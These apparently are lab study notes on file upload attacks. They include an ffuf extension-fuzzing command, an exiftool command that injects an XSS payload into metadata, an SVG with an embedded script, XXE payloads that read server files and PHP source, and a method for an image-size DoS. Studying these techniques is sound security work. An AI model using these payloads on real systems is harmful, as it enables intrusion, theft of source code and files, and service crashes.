fuzzing allowed file extensions is an important exercise for any file upload attack. It enables us to explore what attacks may be achievable on the web server.


fuzzing allowed file extensions is an important exercise for any file upload attack. It enables us to explore what attacks may be achievable on the web server.
```bash
ffuf -u http://TARGET/upload.php -X POST -F "uploadFile=@test.FUZZ" -w /usr/share/seclists/Fuzzing/extensions_common.txt
```


## XSS


example1 :

web application allows us to upload `HTML` files
HTML files won't allow us to execute code (e.g., PHP)
possible to implement JavaScript code within them to carry an XSS
CSRF attack on whoever visits the uploaded HTML page.



target sees a link from a website they trust > trick them into visiting the link while >website is vulnerable to uploading HTML documents

example2 :
web applications that display an image's metadata after its upload

XSS payload in one of the Metadata parameters that accept raw text

like the `Comment` or `Artist` parameters
```bash
AhmaDb0x@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
AhmaDb0x@htb[/htb]$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

>When the image's metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack


>change the image's MIME-Type to `text/html`, some web applications may show it as an HTML document instead of an image

>which case the XSS payload would be triggered even if the metadata wasn't directly displayed


## Finally,

 XSS attacks can also be carried with `SVG` images
`Scalable Vector Graphics (SVG)` == XML-based

primary purpose of XML is the exchange and transfer of data. It encodes data in a format readable by both machines and humans.

and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can modify their XML data to include an XSS payload. For example, we can write the following to `HTB.svg`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

## XXE

With SVG images, we can also include malicious XML data to leak the source code of the web application

and other internal documents within the server. [XML external entity injection]


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>  
<svg>&xxe;</svg>
```


>Once the above SVG image is uploaded and viewed, the XML document would get processed,

upload of `XML` documents, then the same payload can carry the same attack when the XML data is displayed on the web application.


For File Upload exploitation, it may allow us to `locate the upload directory, identify allowed extensions, or find the file naming scheme`, which may become handy for further exploitation.

Code: xml
XXE to read source code in PHP web applications, we can use the following payload in our SVG image
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg> 
```

Once the SVG image is displayed, we should get the base64 encoded content of `index.php`, which we can decode to read the source code.


>Using XML data is not unique to SVG images, as it is also utilized by many types of documents, like `PDF`, `Word Documents`, `PowerPoint Documents`,

## DoS
We can create any `JPG` image file with any image size (e.g. `500x500`), and then manually modify its compression data to say it has a size of (`0xffff x 0xffff`), which results in an image with a perceived size of 4 Gigapixels. When the web application attempts to display the image, it will attempt to allocate all of its memory to this image, resulting in a crash on the back-end server.

